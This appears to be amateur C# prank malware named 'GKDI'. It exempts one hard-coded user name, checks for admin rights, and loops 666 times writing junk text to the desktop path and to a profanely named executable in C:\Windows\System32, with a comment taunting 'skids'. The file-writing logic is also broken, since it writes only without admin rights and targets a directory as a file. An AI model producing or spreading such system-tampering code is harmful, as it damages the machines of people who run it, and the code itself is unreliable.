﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Configuration;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GKDI
{
    public class FileMaker
    {
        // Hi Skid If Your Looking Here lol Just Do It So Anyone can see this code idc
        private bool IsRunAsAdmin()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        public void FileMakerSys32()
        {
                string IfUsername = Environment.UserName;
                string IfUsernameFixer = IfUsername.ToString();
               
                if (@IfUsernameFixer == "IronJules2020")
                {
                    DialogResult result1msg1 = MessageBox.Show("I1R!NWANTTOC!L!O!S!E!?", "COMPTER", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                    if (result1msg1 != DialogResult.Yes)
                    {
                        Application.Exit();
                    }
                    if (result1msg1 != DialogResult.No)
                    {
                        ADMINTRYER();
                    }
                }
                else { ADMINTRYER(); };
                    void ADMINTRYER()
                    {
                        randomstuff randomlit = new randomstuff();
                        if (!IsRunAsAdmin())
                        {
                            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    string sys32path = @"C:\Windows\System32\DICKHEAD";
                            for (int q = 0; q < 666; q++)
                             {
                                File.WriteAllText(desktop, "DEAD GKDI WAS HERE");
                                File.WriteAllText(sys32path + ".exe", "!#¤%&/()=?`^*_:;><,.-'¨´+0987654321~|}][{€$£@666ISHERE}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]][[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[");
                            }

                        }
                    }

            
        }
    }
}
